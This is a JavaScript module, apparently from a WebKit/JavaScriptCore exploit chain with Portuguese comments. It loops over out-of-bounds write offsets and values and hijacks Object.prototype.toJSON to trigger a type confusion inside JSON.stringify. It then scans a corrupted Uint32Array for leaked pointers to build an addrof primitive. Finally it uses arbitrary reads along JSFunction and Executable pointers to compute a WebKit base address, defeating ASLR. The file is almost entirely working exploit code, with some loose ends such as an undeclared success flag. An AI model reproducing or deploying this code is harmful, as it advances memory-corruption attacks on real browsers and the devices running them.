// js/script3/testArrayBufferVictimCrash.mjs (R43L - Testes Massivos Finais para Addrof)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_MassiveFinalAddrof";

const VICTIM_TA_SIZE_ELEMENTS = 16; // Aumentar para ter mais espaço para possível leak de ponteiro
const VICTIM_TA_BUFFER_SIZE_BYTES = VICTIM_TA_SIZE_ELEMENTS * 4; // Uint32

const OOB_OFFSETS_TO_TEST_FINAL = [0x6C, 0x70, 0x74, 0x78, 0x7C, 0x80, 0x84, 0x88, 0x8C, 0x90]; // Faixa em torno do offset de TC conhecido
const OOB_VALUES_TO_TEST_FINAL = [
    0xABABABAB, 0xCDCDCDCD, 0xFFFFFFFF, 0x00000000, 0x41414141,
    (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 0xDEF00002),
];

const FILL_PATTERN_VICTIM_TA_FINAL = 0xBADF00D5;
const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let target_function_for_webkit_leak; // A função cujo endereço queremos para o WebKit leak
let leaked_m2_or_target_addr = null; // Endereço de M2 ou da função alvo, se addrof for bem-sucedido

function isValidPointer(ptr, context = "") { /* ... (sem alteração da última versão) ... */
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração da última versão) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    try { return toHex(value); } catch (e) { return String(value); }
}
function logTypedArrayShort(ta, name = "TypedArray", max = 8) { /* ... (aumentar max para ver mais) ... */
    if (!ta || typeof ta.slice !== 'function') { return "N/A"; }
    const content = Array.from(ta.slice(0, Math.min(ta.length, max))).map(v => safeToHex(v));
    return `${name}[${content.join(", ")}${ta.length > max ? "..." : ""}] (len:${ta.length}, byteLen:${ta.byteLength})`;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Testes Massivos Finais para Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init MassiveFinal...`;

    target_function_for_webkit_leak = function someUniqueLeakFunctionR43L_MassiveFinal() { return `target_R43L_MassiveFinal_${Date.now()}`; };
    
    let final_probe_call_count_for_report = 0;

    logS3(`--- Fase 0 (MassiveFinal): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { /* ... (retorno de erro do sanity check) ... */
        return { errorOccurred: "OOB Sanity Check Failed", tc_probe_details: null, 
                 addrof_result: { success: false, msg: "Addrof (MassiveFinal): Not run." },
                 webkit_leak_result: { success: false, msg: "WebKit Leak (MassiveFinal): Not run." },
                 iteration_results_summary: [], total_probe_calls_last_iter: 0, 
                 oob_params_of_best_result: null, heisenbug_on_M2_in_best_result: false, 
                 best_victim_analysis: null }; 
    }

    let iteration_results_summary = [];
    let best_result_overall = {
        errorOccurred: null, tc_probe_details: null, stringifyResultSonda: null,
        addrof_result: { success: false, msg: "Addrof (MassiveFinal): Não obtido.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (MassiveFinal): Não obtido.", webkit_base_candidate: null },
        oob_params_of_best_result: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        best_victim_analysis: null // Para armazenar a análise do victim_ta que levou ao addrof
    };
    
    let global_addrof_obtained_flag = false;
    let global_webkit_leak_obtained_flag = false;

    for (const current_oob_offset of OOB_OFFSETS_TO_TEST_FINAL) {
        if (global_addrof_obtained_flag && global_webkit_leak_obtained_flag) break; 

        for (const current_oob_value of OOB_VALUES_TO_TEST_FINAL) {
            if (global_addrof_obtained_flag && global_webkit_leak_obtained_flag) break;
            if (current_oob_value === null || current_oob_value === undefined) continue;

            leaked_m2_or_target_addr = null; // Resetar para esta iteração específica

            const current_oob_hex_val = safeToHex(current_oob_value);
            const current_offset_hex = safeToHex(current_oob_offset);
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_Val${current_oob_hex_val}`;

            logS3(`\n===== ITERATION MassiveFinal: Offset OOB: ${current_offset_hex}, Valor OOB: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val}`;

            let victim_ta_for_json_trigger = null; // O TypedArray passado para JSON.stringify
            let iter_victim_analysis = {
                offset_tested: current_offset_hex, value_written: current_oob_hex_val,
                notes: "",
                found_pointers_in_victim_ta: [], // Armazenar [index, val_low, val_high, Addr64Str]
                addrof_achieved_via_victim_corruption: false
            };

            let probe_call_count_iter = 0;
            let m1_ref = null; let m2_ref = null;
            let tc_detected_this_iter = false;
            let tc_details_this_iter = null;

            function massive_final_probe_toJSON() {
                probe_call_count_iter++; const call_num = probe_call_count_iter;
                const ctts = Object.prototype.toString.call(this);
                const is_m2c = (this === m2_ref && m2_ref !== null);

                try {
                    if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                    if (call_num === 1 && this === victim_ta_for_json_trigger) {
                        m2_ref = { 
                            id: "M2_MassiveFinal", 
                            // Colocar a função alvo aqui é importante se quisermos seu addrof
                            // e se M2 for o objeto cujo endereço vazamos.
                            target_function_prop: target_function_for_webkit_leak 
                        };
                        m1_ref = { id: "M1_MassiveFinal", m2: m2_ref };
                        logS3(`[PROBE_MassiveFinal] Call #${call_num}: 'this' é victim_ta_for_json_trigger. M1/M2 criados.`, "debug_detail");
                        
                        // ----- ANÁLISE DO VICTIM_TA_FOR_JSON_TRIGGER APÓS OOB WRITE E CRIAÇÃO DE M1/M2 -----
                        // A escrita OOB aconteceu ANTES desta chamada de sonda.
                        // M1 e M2 acabaram de ser alocados. Se a escrita OOB os atingiu ou algo próximo
                        // que corrompeu o victim_ta_for_json_trigger, poderemos ver aqui.
                        logS3(`   [PROBE_MassiveFinal] Analisando victim_ta_for_json_trigger DENTRO da 1a chamada da sonda (após OOB e M1/M2 alloc):`, "info_emphasis");
                        for (let i = 0; i < victim_ta_for_json_trigger.length - 1; i += 2) { // Ler pares de Uint32
                            const low = victim_ta_for_json_trigger[i];
                            const high = victim_ta_for_json_trigger[i+1];
                            if (low !== FILL_PATTERN_VICTIM_TA_FINAL || high !== FILL_PATTERN_VICTIM_TA_FINAL) { // Se diferente do padrão
                                let potential_ptr = new AdvancedInt64(low, high);
                                logS3(`     victim_ta[${i}/${i+1}]: L=0x${low.toString(16)}, H=0x${high.toString(16)} -> ${potential_ptr.toString(true)}`, "leak");
                                if (isValidPointer(potential_ptr, "_victimCorruptionCheck")) {
                                    logS3(`       !!! PONTEIRO VÁLIDO ENCONTRADO em victim_ta_for_json_trigger[${i}/${i+1}]: ${potential_ptr.toString(true)} !!!`, "success_major");
                                    iter_victim_analysis.found_pointers_in_victim_ta.push({index: i, low: low, high: high, addr_str: potential_ptr.toString(true)});
                                    // ASSUMIR que este é o endereço de M2 ou da função alvo se for o primeiro encontrado.
                                    // Esta é uma heurística e pode precisar de refinamento (ex: comparar com outros ponteiros se tivermos).
                                    if (!leaked_m2_or_target_addr) {
                                        leaked_m2_or_target_addr = potential_ptr;
                                        iter_victim_analysis.addrof_achieved_via_victim_corruption = true;
                                        found_addrof_primitive_in_iteration = true; // Sinalizar sucesso nesta iteração
                                        global_addrof_obtained_flag = true; // Sinalizar sucesso global
                                        iter_victim_analysis.notes += `Addrof putativo de M2/Target via victim_ta[${i}]: ${potential_ptr.toString(true)}. `;
                                    }
                                }
                            }
                        }
                        if (!iter_victim_analysis.addrof_achieved_via_victim_corruption) {
                            logS3(`   [PROBE_MassiveFinal] Nenhum ponteiro válido óbvio encontrado em victim_ta_for_json_trigger.`, "info");
                        }
                        // ----- FIM DA ANÁLISE -----
                        return m1_ref;
                    } else if (is_m2c) {
                        if (!tc_detected_this_iter) {
                            tc_detected_this_iter = true;
                            tc_details_this_iter = { /* ... */ this_is_M2: true, notes: "TC Confirmada."};
                            logS3(`[PROBE_MassiveFinal] Call #${call_num} (M2C): FIRST TC. 'this' é M2 (id: ${this.id}).`, "vuln");
                        }
                        // Se 'this' (M2) contiver a função alvo, e já tivermos o addrof de M2,
                        // podemos usar arb_read para obter o endereço da função alvo.
                        // M2.target_function_prop é a target_function_for_webkit_leak.
                        // Se leaked_m2_or_target_addr é o addrof(M2), então:
                        // addr_of_target_func = arb_read(leaked_m2_or_target_addr + offset_de_target_function_prop_em_M2)
                        // Isto requer saber o offset da propriedade 'target_function_prop' dentro do objeto M2.
                        // O objeto M2 é um JSObject simples. Seu layout de propriedades é em um butterfly.
                        // Obter este offset é complexo sem mais primitivas.
                        // Por enquanto, se leaked_m2_or_target_addr for obtido, vamos assumir que ele é diretamente
                        // o endereço da target_function_for_webkit_leak, ou que o WebKitLeak usará o que for obtido.
                        return this;
                    }
                } catch (e_pm) { /* ... */ }
                return { gen_m: call_num, type: ctts };
            }

            let iter_primary_error = null;
            let iter_stringify_output_raw = null; // Corrigido
            try {
                victim_ta_for_json_trigger = new Uint32Array(VICTIM_TA_SIZE_ELEMENTS);
                victim_ta_for_json_trigger.fill(FILL_PATTERN_VICTIM_TA_FINAL);
                logS3(`   Victim Uint32Array (victim_ta_for_json_trigger) criado e preenchido com padrão 0x${FILL_PATTERN_VICTIM_TA_FINAL.toString(16)}.`, 'info');

                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
                oob_write_absolute(current_oob_offset, current_oob_value, 4);
                logS3(`   OOB Write: ${current_oob_hex_val} @ ${current_offset_hex}`, 'info');
                await PAUSE_S3(150); // Pausa crucial para o Heisenbug

                const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: massive_final_probe_toJSON, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    iter_stringify_output_raw = JSON.stringify(victim_ta_for_json_trigger); // A análise do victim_ta acontece na 1a chamada da sonda
                    logS3(`   JSON.stringify output: ${iter_stringify_output_raw ? iter_stringify_output_raw.substring(0,100) : "null" }...`, "debug_detail");
                    if (tc_detected_this_iter) logS3(`  TC Probe (MassiveFinal): TC CONFIRMADA.`, "vuln");
                    else logS3(`  TC Probe (MassiveFinal): TC NÃO Confirmada.`, "warn");
                } catch (e_str) { iter_primary_error = e_str; logS3(`  JSON.stringify EXCEPTION: ${e_str.message}`, "error"); }
                finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }

                // Atualizar o resultado principal de addrof se encontrado nesta iteração
                if (found_addrof_primitive_in_iteration && leaked_m2_or_target_addr) {
                    best_result_overall.addrof_result = { 
                        success: true, 
                        msg: `Addrof obtido via corrupção de victim_ta: ${leaked_m2_or_target_addr.toString(true)}`, 
                        leaked_object_addr: leaked_m2_or_target_addr.toString(true) 
                    };
                    // Tentar WebKitLeak
                    if (arb_read) { // Verificar se arb_read está disponível
                        logS3(`  Tentando WebKitLeak com endereço vazado: ${leaked_m2_or_target_addr.toString(true)}`, "info_emphasis");
                        // ASSUMINDO que leaked_m2_or_target_addr é o endereço da target_function_for_webkit_leak
                        // Se for o endereço de M2, precisaríamos ler o ponteiro da propriedade target_function_prop
                        // usando arb_read(leaked_m2_or_target_addr + offset_da_propriedade).
                        // Por simplicidade, vamos tentar usá-lo diretamente se for um ponteiro válido.
                        // Idealmente, a sonda confirmaria se o ponteiro é de M2 ou da função.
                        // Para este teste, vamos assumir que se addrof foi bem-sucedido, leaked_m2_or_target_addr é o da função.
                        // (Esta é uma simplificação e pode precisar de ajuste)
                        
                        // Para WebKitLeak, precisamos do endereço de uma *função*.
                        // Se o leaked_m2_or_target_addr for o endereço de m2_ref, precisamos obter o endereço de m2_ref.target_function_prop
                        // Isso requer conhecer o offset da propriedade 'target_function_prop' dentro do objeto JS m2_ref.
                        // Isso é complicado sem mais informações sobre o layout do objeto.
                        // Vamos *assumir* por agora que o leaked_m2_or_target_addr é o da *função alvo*.
                        // Se não for, o WebKitLeak falhará ou precisará de adaptação.
                        let addr_for_wk_leak = leaked_m2_or_target_addr; // Assunção inicial
                        
                        // Se tivéssemos certeza que leaked_m2_or_target_addr é M2, e M2 tem target_function_prop:
                        // (Esta parte é PSEUDOCÓDIGO para a ideia, requer offset da propriedade)
                        // const OFFSET_TARGET_FUNC_PROP_IN_M2 = new AdvancedInt64(0xSOMEOFFSET); // PRECISA SER DESCOBERTO
                        // addr_for_wk_leak = await arb_read(leaked_m2_or_target_addr.add(OFFSET_TARGET_FUNC_PROP_IN_M2), 8);
                        // if (!isValidPointer(addr_for_wk_leak, "_m2TargetFuncProp")) {
                        //    logS3("  Não foi possível ler o ponteiro da função alvo de M2.", "error");
                        //    addr_for_wk_leak = null; // Não usar para WebKitLeak
                        // }

                        if (addr_for_wk_leak && isValidPointer(addr_for_wk_leak, "_preWkLeak")) { // Certificar que o endereço a ser usado é válido
                            try {
                                const ptr_exe = await arb_read(addr_for_wk_leak.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                                if (isValidPointer(ptr_exe, "_wkLeakExe")) {
                                    const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                                    if (isValidPointer(ptr_jitvm, "_wkLeakJitVm")) {
                                        const base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
                                        logS3(`  !!! POTENCIAL WEBKIT BASE: ${base_candidate.toString(true)} !!!`, "success_major");
                                        best_result_overall.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${base_candidate.toString(true)}`, webkit_base_candidate: base_candidate.toString(true) };
                                        global_webkit_leak_obtained_flag = true;
                                    } else { throw new Error("Ponteiro JIT/VM inválido."); }
                                } else { throw new Error("Ponteiro Executable inválido."); }
                            } catch(e_wk_leak) {
                                logS3(`  Erro no WebKitLeak: ${e_wk_leak.message}`, "error");
                                best_result_overall.webkit_leak_result = { success: false, msg: `WebKitLeak falhou: ${e_wk_leak.message}` };
                            }
                        } else {
                             logS3("  Endereço para WebKitLeak não é válido ou não é de função.", "warn");
                             best_result_overall.webkit_leak_result = { success: false, msg: "Endereço para WebKitLeak inválido/não funcional." };
                        }
                    }
                }

            } catch (e_outer_iter) { iter_primary_error = e_outer_iter; }
            finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` }); }

            let current_iter_summary = {
                oob_offset: current_offset_hex, oob_value: current_oob_hex_val,
                raw_oob_offset: current_oob_offset, raw_oob_value: current_oob_value,
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: tc_details_this_iter,
                victim_ta_analysis: iter_victim_analysis,
                addrof_success_this_iter: found_addrof_primitive_in_iteration,
                webkit_leak_success_this_iter: global_webkit_leak_obtained_flag && found_addrof_primitive_in_iteration, // WebKitLeak só é relevante se addrof desta iter funcionou
                heisenbug_on_M2_confirmed_by_tc_probe: tc_detected_this_iter
            };
            iteration_results_summary.push(current_iter_summary);

            // Lógica para atualizar best_result_overall
            if (current_iter_summary.error === null) {
                let current_is_better = false;
                // Prioridade: WebKitLeak > Addrof > TC
                if (current_iter_summary.webkit_leak_success_this_iter && !best_result_overall.webkit_leak_result.success) current_is_better = true;
                else if (current_iter_summary.webkit_leak_success_this_iter === best_result_overall.webkit_leak_result.success) {
                    if (current_iter_summary.addrof_success_this_iter && !best_result_overall.addrof_result.success) current_is_better = true;
                    else if (current_iter_summary.addrof_success_this_iter === best_result_overall.addrof_result.success) {
                        if (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe && !best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe) current_is_better = true;
                    }
                }
                 if (best_result_overall.oob_params_of_best_result === null && !current_iter_summary.error) current_is_better = true;


                if (current_is_better) {
                    best_result_overall.errorOccurred = null;
                    best_result_overall.tc_probe_details = current_iter_summary.tc_probe_details;
                    best_result_overall.addrof_result.success = current_iter_summary.addrof_success_this_iter;
                    if(current_iter_summary.addrof_success_this_iter && leaked_m2_or_target_addr) {
                        best_result_overall.addrof_result.leaked_object_addr = leaked_m2_or_target_addr.toString(true);
                        best_result_overall.addrof_result.msg = `Addrof obtido: ${leaked_m2_or_target_addr.toString(true)}`;
                    } else if (!current_iter_summary.addrof_success_this_iter) {
                        best_result_overall.addrof_result.msg = "Addrof (MassiveFinal): Não obtido no melhor resultado.";
                        best_result_overall.addrof_result.leaked_object_addr = null;
                    }
                    // WebKit leak result já é atualizado globalmente se bem sucedido
                    if (current_iter_summary.webkit_leak_success_this_iter && !best_result_overall.webkit_leak_result.success) {
                        // Se o WebKitLeak foi obtido nesta iteração, ele já estará em best_result_overall.webkit_leak_result
                    }

                    best_result_overall.oob_params_of_best_result = { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_oob_offset, raw_value: current_oob_value };
                    best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
                    best_result_overall.best_victim_analysis = current_iter_summary.victim_ta_analysis;
                    logS3(`*** NOVO MELHOR RESULTADO: Off ${current_offset_hex} Val ${current_oob_hex_val} (Addrof:${current_iter_summary.addrof_success_this_iter}, TC:${current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe}) ***`, "success_major");
                }
            }
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val} TC:${tc_detected_this_iter} Addr:${found_addrof_primitive_in_iteration}`;
            await PAUSE_S3(50);
        }
        if (global_addrof_obtained_flag && global_webkit_leak_obtained_flag) break;
        await PAUSE_S3(100);
    }

    best_result_overall.total_probe_calls_last_iter = final_probe_call_count_for_report;
    best_result_overall.iteration_results_summary = iteration_results_summary;
    best_result_overall.oob_value_of_best_result = best_result_overall.oob_params_of_best_result ? `${best_result_overall.oob_params_of_best_result.offset}_${best_result_overall.oob_params_of_best_result.value}` : "N/A";

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final best_result_overall (Massive Test Final): ${JSON.stringify(best_result_overall, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    let final_title = `${FNAME_CURRENT_TEST_BASE} Final: `;
    if(best_result_overall.webkit_leak_result.success) final_title += "WEBKITLEAK_OK! ";
    else if(best_result_overall.addrof_result.success) final_title += "ADDROF_OK! ";
    else if(best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe) final_title += "TC_OK ";
    if(final_title === `${FNAME_CURRENT_TEST_BASE} Final: `) final_title += "NoMajorSuccess";
    document.title = final_title.trim();

    return best_result_overall;
}
